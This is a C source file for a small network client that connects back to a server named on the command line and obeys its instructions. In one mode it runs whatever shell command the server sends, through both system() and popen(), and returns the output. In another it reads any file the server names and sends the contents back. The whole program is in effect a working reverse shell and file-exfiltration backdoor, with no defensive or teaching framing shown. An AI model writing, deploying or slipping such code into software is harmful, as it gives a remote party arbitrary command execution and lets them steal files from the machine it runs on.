#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

void sendMessage(FILE *file_p, int sockfd, char *buffer);

void error(char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
    int sockfd, portno, n;

    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[256];

    FILE *file_p;

    if (argc < 3) {
       fprintf(stderr,"usage %s hostname port\n", argv[0]);
       exit(0);
    }
    portno = atoi(argv[2]);

    // Initialize socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) 
        error("ERROR opening socket");

    // Find server
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);

    // Connect to server
    if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) 
        error("ERROR connecting");
    
    while (1) {
        bzero(buffer, 256);
        if (read(sockfd, buffer, 255) < 0)
            error("ERROR reading from socket");

        // Use command line tool
        if (strcmp(buffer, "COMMAND LINE MODE\n") == 0) {
            bzero(buffer, 256);
            if (read(sockfd, buffer, 255) < 0)
                error("ERROR reading from socket");
            printf("Here is the command: %s\n", buffer);
            system(buffer); //ONLY FOR TESTING. SHOULD BE COMMENTED.
            file_p = popen(buffer, "r");
            sendMessage(file_p, sockfd, buffer);
        }
        
        // Read file
        else if (strcmp(buffer, "READ MODE\n") == 0) {
            bzero(buffer, 256);
            if (read(sockfd, buffer, 255) < 0)
                error("ERROR reading from socket");
            printf("Here is the file name: %s\n", buffer);
            file_p = fopen(strtok(buffer, "\n"), "r");
            printf("%s", buffer);
            sendMessage(file_p, sockfd, buffer);
        }

    }
    return 0;
}

void sendMessage(FILE *file_p, int sockfd, char *buffer) {
    if (!file_p) 
        error("ERROR executing command");
    bzero(buffer, 256);
    while (fgets(buffer, 255, file_p) != NULL) {
        printf("%s", buffer);
        if (write(sockfd, buffer, 255) < 0)
            error("ERROR writing to socket");
        bzero(buffer, 256);
        usleep(1000);
    }
    if (write(sockfd, "END\n", 255) < 0)
        error("ERROR writing to socket");
    pclose(file_p);
}